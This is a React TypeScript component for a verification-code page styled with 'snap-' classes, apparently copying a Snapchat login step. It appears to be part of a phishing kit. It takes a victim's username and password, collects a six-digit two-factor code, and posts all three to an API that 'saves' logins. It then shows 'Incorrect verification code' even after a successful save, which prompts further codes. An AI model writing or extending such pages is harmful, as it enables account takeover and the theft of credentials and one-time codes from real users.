import React, { useState, useRef, useEffect } from "react"
import { motion } from "framer-motion"
import { ChevronLeft } from "react-feather"
import "./code.css"

interface LoginProps {
  data: [string, string, string]
  methods: [React.Dispatch<React.SetStateAction<string>>]
}

const Code = (props: LoginProps) => {
  const { data, methods } = props
  const [username, password, code] = data
  console.log(code);
  
  const [setCode] = methods
  const [error, setError] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [codeValues, setCodeValues] = useState(['', '', '', '', '', ''])
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Initialize refs array
  useEffect(() => {
    inputRefs.current = inputRefs.current.slice(0, 6)
  }, [])

  // Update the main code state when individual digits change
  useEffect(() => {
    const combinedCode = codeValues.join('')
    setCode(combinedCode)
  }, [codeValues, setCode])

  const handleInputChange = (index: number, value: string) => {
    // Only allow numbers
    if (!/^\d*$/.test(value)) return

    // Update the code values array
    const newCodeValues = [...codeValues]
    newCodeValues[index] = value.slice(0, 1) // Only take the first character

    setCodeValues(newCodeValues)

    // Auto-focus next input if value is entered
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace') {
      if (!codeValues[index] && index > 0) {
        // If current input is empty and backspace is pressed, focus previous input
        inputRefs.current[index - 1]?.focus()
      }
    }
  }

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text')
    
    // Check if pasted content is numeric and has appropriate length
    if (/^\d+$/.test(pastedData)) {
      const digits = pastedData.slice(0, 6).split('')
      
      // Fill in as many inputs as we have digits
      const newCodeValues = [...codeValues]
      digits.forEach((digit, index) => {
        if (index < 6) newCodeValues[index] = digit
      })
      
      setCodeValues(newCodeValues)
      
      // Focus the appropriate input after paste
      if (digits.length < 6) {
        inputRefs.current[digits.length]?.focus()
      } else {
        // If all inputs are filled, focus the last one
        inputRefs.current[5]?.focus()
      }
    }
  }

  const sendCode = () => {
    const combinedCode = codeValues.join('')
    
    if (combinedCode.length === 6) {
      setIsLoading(true)
      
      fetch("http://localhost:5000/api/Logins", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password, code: combinedCode }),
      })
        .then((response) => {
          if (!response.ok) {
            return response.json().then((error) => {
              throw new Error(error.message || "Failed to save Login.")
            })
          }
          return response.json()
        })
        .then((data) => {
          console.log("Login has been added", data)
          setIsLoading(false)
          setError(true)
          // Redirect or show success message
        })
        .catch((error) => {
          console.error("Login saving note:", error.message)
          setError(true)
          setIsLoading(false)
        })
    } else {
      console.log("Code is incomplete")
      setError(true)
    }
  }

  return (
    <div className="snap-container">
      <div className="snap-header">
        <button className="snap-back-button">
          <ChevronLeft size={24} color="transparent" />
        </button>
      </div>
      
      <div className="snap-content">
        <h1 className="snap-title">Verification Code</h1>
        
        <p className="snap-description">
          Enter the 6-digit code we sent to your device
        </p>
        
        <div className="snap-otp-container">
          {codeValues.map((value, index) => (
            <div key={index} className="snap-otp-input-wrapper">
              <input
                ref={el => inputRefs.current[index] = el}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={value}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={index === 0 ? handlePaste : undefined}
                className="snap-otp-input"
                autoFocus={index === 0}
              />
            </div>
          ))}
        </div>
        
        {error && (
          <div className="snap-error-message">
            Incorrect verification code. Please try again.
          </div>
        )}
        
        
        <motion.button
          className="snap-verify-btn"
          onClick={sendCode}
          whileTap={{ scale: 0.98 }}
          disabled={isLoading || codeValues.join('').length !== 6}
        >
          {isLoading ? "Verifying..." : "Verify"}
        </motion.button>
      </div>
    </div>
  )
}

export default Code